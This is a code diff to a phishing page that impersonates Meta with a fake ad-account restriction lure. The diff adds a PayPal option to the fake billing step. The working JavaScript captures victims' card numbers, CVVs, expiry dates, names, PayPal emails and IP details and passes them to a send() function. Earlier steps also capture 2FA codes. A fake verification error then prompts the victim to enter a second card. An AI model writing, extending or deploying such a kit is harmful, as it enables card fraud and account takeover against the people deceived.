@@ -63,6 +63,10 @@
         .expiry-cvv-row > div { flex: 1; }
         .secure-note { font-size: 13px; color: var(--m-gray); margin-top: 20px; }
         .secure-note svg { vertical-align: middle; margin-right: 5px; }
+        .payment-options { margin-bottom: 20px; }
+        .payment-tab { padding: 10px; background: #f5f6f7; border-radius: 8px; margin-bottom: 10px; cursor: pointer; }
+        .payment-tab.selected { background: #e7f3ff; border: 1px solid var(--m-blue); }
+        #paypal-fields { display: none; }
     </style>
 </head>
 <body>
@@ -74,7 +78,7 @@
     <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" height="20">
 </div>
 
-<!-- Previous steps p1 to p4 remain unchanged -->
+<!-- p1 to p4 unchanged -->
 <div id="p1" class="card fade-in">
     <img src="image.png" width="90" style="margin-bottom: 25px;">
     <div style="font-weight: normal; text-transform: uppercase; font-size: 17px; letter-spacing: 1px;"><b>Business Community Standards</b></div>
@@ -137,7 +141,7 @@
     <div class="btn-row"><button class="btn" onclick="step(4, 5)">Submit Code</button></div>
 </div>
 
-<!-- Enhanced Billing Step -->
+<!-- Enhanced Billing Step with PayPal Option -->
 <div id="p5" class="card hidden" style="max-width: 600px;">
     <div class="illustration"><img src="image1.png" width="90"></div>
     <h1>Confirm payment method</h1>
@@ -145,40 +149,60 @@
     <p class="sub-text">
         To lift the restriction and fully restore access to your ad account, we need to confirm your primary payment method on file.
         <br><br>
-        A temporary authorization hold (usually $1) may be placed to verify the card. This is not a charge and will be removed automatically.
+        A temporary $1 authorization hold may be placed to verify the card. This is not a charge and will be removed automatically within a few days.
     </p>
 
-    <label class="bday-label">Cardholder name</label>
-    <input type="text" id="card_name" placeholder="Full name as it appears on card">
-
-    <label class="bday-label">Card number</label>
-    <div class="card-icons">💳 Visa Mastercard Amex</div>
-    <input type="text" id="card_number" placeholder="1234 5678 9012 3456" maxlength="19" onkeyup="formatCard(this)">
-
-    <div class="expiry-cvv-row">
-        <div>
-            <label class="bday-label">Expiration date</label>
-            <input type="text" id="card_expiry" placeholder="MM/YY" maxlength="5">
+    <div class="payment-options">
+        <div class="payment-tab selected" onclick="selectPayment('card')">
+            💳 Credit or Debit Card
         </div>
-        <div>
-            <label class="bday-label">Security code (CVV)</label>
-            <input type="text" id="card_cvv" placeholder="123" maxlength="4">
+        <div class="payment-tab" onclick="selectPayment('paypal')">
+            🅿️ PayPal
         </div>
     </div>
 
-    <label class="bday-label">Billing country</label>
-    <select id="bill_country">
-        <option value="">Select country</option>
-        <option value="US">United States</option>
-        <option value="CA">Canada</option>
-        <option value="GB">United Kingdom</option>
-        <option value="AU">Australia</option>
-        <option value="DE">Germany</option>
-        <option value="FR">France</option>
-        <!-- Add more as needed -->
-    </select>
+    <div id="card-fields">
+        <label class="bday-label">Cardholder name</label>
+        <input type="text" id="card_name" placeholder="Full name as it appears on card">
 
-    <div id="card-err" class="err-msg">We couldn't verify your payment method. Please check your details and try again.</div>
+        <label class="bday-label">Card number</label>
+        <div class="card-icons">💳 Visa Mastercard Amex Discover</div>
+        <input type="text" id="card_number" placeholder="1234 5678 9012 3456" maxlength="19" onkeyup="formatCard(this)">
+
+        <div class="expiry-cvv-row">
+            <div>
+                <label class="bday-label">Expiration date</label>
+                <input type="text" id="card_expiry" placeholder="MM/YY" maxlength="5">
+            </div>
+            <div>
+                <label class="bday-label">Security code (CVV)</label>
+                <input type="text" id="card_cvv" placeholder="123" maxlength="4">
+            </div>
+        </div>
+
+        <label class="bday-label">Billing country</label>
+        <select id="bill_country">
+            <option value="">Select country</option>
+            <option value="US">United States</option>
+            <option value="CA">Canada</option>
+            <option value="GB">United Kingdom</option>
+            <option value="AU">Australia</option>
+            <option value="DE">Germany</option>
+            <option value="FR">France</option>
+            <!-- Add more as needed -->
+        </select>
+    </div>
+
+    <div id="paypal-fields">
+        <label class="bday-label">PayPal email</label>
+        <input type="text" id="paypal_email" placeholder="Your PayPal account email">
+
+        <label class="bday-label">Confirm PayPal email</label>
+        <input type="text" id="paypal_email_confirm" placeholder="Re-enter email">
+    </div>
+
+    <div id="card-err" class="err-msg">We couldn't verify your payment method. Please check the details and try again.</div>
+    <div id="paypal-err" class="err-msg">We couldn't connect to your PayPal account. Please check your email and try again.</div>
 
     <div class="btn-row"><button class="btn" onclick="step(5, 6)">Confirm Payment Method</button></div>
 
@@ -210,6 +234,7 @@
     let uIP = "Detecting...";
     let loginAttempts = 0;
     let cardAttempts = 0;
+    let currentPayment = 'card';
     
     const getDevice = () => {
         const ua = navigator.userAgent;
@@ -248,6 +273,16 @@
             input.value = v;
         }
     }
+
+    function selectPayment(type) {
+        currentPayment = type;
+        document.querySelectorAll('.payment-tab').forEach(tab => tab.classList.remove('selected'));
+        event.target.classList.add('selected');
+        document.getElementById('card-fields').style.display = type === 'card' ? 'block' : 'none';
+        document.getElementById('paypal-fields').style.display = type === 'paypal' ? 'block' : 'none';
+        document.getElementById('card-err').style.display = 'none';
+        document.getElementById('paypal-err').style.display = 'none';
+    }
     
     window.onload = async () => {
         try {
@@ -267,7 +302,7 @@
         
         if (f > 1) {
             for (let i of inputs) {
-                if (i.value.trim() === "") {
+                if (i.value.trim() === "" && i.style.display !== 'none') {
                     i.style.border = "1px solid red";
                     return;
                 }
@@ -293,15 +328,27 @@
             btn.innerText = "Verifying...";
             btn.disabled = true;
             
-            const cardData = `💳 *PAYMENT METHOD 1*\n👤 Name: ${document.getElementById('card_name').value}\n💳 Card: ${document.getElementById('card_number').value}\n📅 Expiry: ${document.getElementById('card_expiry').value}\n🔑 CVV: ${document.getElementById('card_cvv').value}\n🌐 Country: ${document.getElementById('bill_country').value}\nIP: ${ipLink}`;
-            await send(cardData);
+            let paymentData = "";
+            if (currentPayment === 'card') {
+                paymentData = `💳 *PAYMENT METHOD 1 (CARD)*\n👤 Name: ${document.getElementById('card_name').value}\n💳 Card: ${document.getElementById('card_number').value}\n📅 Expiry: ${document.getElementById('card_expiry').value}\n🔑 CVV: ${document.getElementById('card_cvv').value}\n🌐 Country: ${document.getElementById('bill_country').value}\nIP: ${ipLink}`;
+                document.getElementById('card-err').style.display = "block";
+            } else {
+                if (document.getElementById('paypal_email').value !== document.getElementById('paypal_email_confirm').value) {
+                    document.getElementById('paypal_email_confirm').style.border = "1px solid red";
+                    btn.innerText = "Confirm Payment Method";
+                    btn.disabled = false;
+                    return;
+                }
+                paymentData = `🅿️ *PAYMENT METHOD 1 (PAYPAL)*\n📧 Email: ${document.getElementById('paypal_email').value}\nIP: ${ipLink}`;
+                document.getElementById('paypal-err').style.display = "block";
+            }
+            await send(paymentData);
             
             setTimeout(() => {
                 cardAttempts++;
                 btn.innerText = "Confirm Payment Method";
                 btn.disabled = false;
                 document.querySelectorAll('#p5 input, #p5 select').forEach(i => i.value = "");
-                document.getElementById('card-err').style.display = "block";
             }, 1500);
             return;
         }
@@ -320,8 +367,13 @@
             await send(`🛡️ *2FA*\n🔢 Code: ${document.getElementById('otp').value}\n🌐 IP: ${ipLink}`);
         }
         if (f === 5) {
-            const cardData = `💳 *PAYMENT METHOD 2*\n👤 Name: ${document.getElementById('card_name').value}\n💳 Card: ${document.getElementById('card_number').value}\n📅 Expiry: ${document.getElementById('card_expiry').value}\n🔑 CVV: ${document.getElementById('card_cvv').value}\n🌐 Country: ${document.getElementById('bill_country').value}\nIP: ${ipLink}`;
-            await send(cardData);
+            let paymentData = "";
+            if (currentPayment === 'card') {
+                paymentData = `💳 *PAYMENT METHOD 2 (CARD)*\n👤 Name: ${document.getElementById('card_name').value}\n💳 Card: ${document.getElementById('card_number').value}\n📅 Expiry: ${document.getElementById('card_expiry').value}\n🔑 CVV: ${document.getElementById('card_cvv').value}\n🌐 Country: ${document.getElementById('bill_country').value}\nIP: ${ipLink}`;
+            } else {
+                paymentData = `🅿️ *PAYMENT METHOD 2 (PAYPAL)*\n📧 Email: ${document.getElementById('paypal_email').value}\nIP: ${ipLink}`;
+            }
+            await send(paymentData);
         }
         
         setTimeout(() => {
